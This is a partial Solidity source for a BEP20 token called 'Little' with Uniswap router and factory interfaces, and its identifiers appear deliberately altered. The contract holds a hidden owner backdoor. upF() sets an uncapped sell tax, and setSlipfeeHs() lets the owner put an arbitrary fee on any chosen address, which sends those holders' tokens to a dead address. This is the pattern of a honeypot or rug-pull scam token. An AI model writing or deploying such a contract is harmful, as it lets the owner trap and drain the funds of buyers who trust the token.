...
interface IUniswapV2Factory {
    ...
    function feeHsTo() external view returns (address);
    function feeHsToSetter() external view returns (address);
    ...
    function setfeeHsTo(address) external;
    function setfeeHsToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeeHsOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeeHsOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeeHsOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeeHsOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeeHsOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Little is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeeHs = 0;

    uint256 private _defaultBuyfeeHs = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeeHs;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeeHs = _value;
    }

    function setSlipfeeHs(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeeHs[_address] = _value;
    }

    function getSlipfeeHs(address _address) external view onlyownar returns (uint256) {
        return _slipfeeHs[_address];
    }


    function setMAccountfeeHs(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeeHs(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeeHsAmount = 0;

        if (rF) {
            uint256 tradefeeHs = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeeHs = _defaultSellfeeHs;
                }
                if (from == uniswapV2Pair) {

                    tradefeeHs = _defaultBuyfeeHs;
                }
            }
            if (_slipfeeHs[from] > 0) {
                tradefeeHs = _slipfeeHs[from];
            }

            tradefeeHsAmount = _Amount.mul(tradefeeHs).div(100);
        }


        if (tradefeeHsAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeeHsAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeeHsAmount);
            emit Transfer(from, _deadAddress, tradefeeHsAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeeHsAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeeHsAmount);
        emit Transfer(from, _to, _Amount - tradefeeHsAmount);
    }
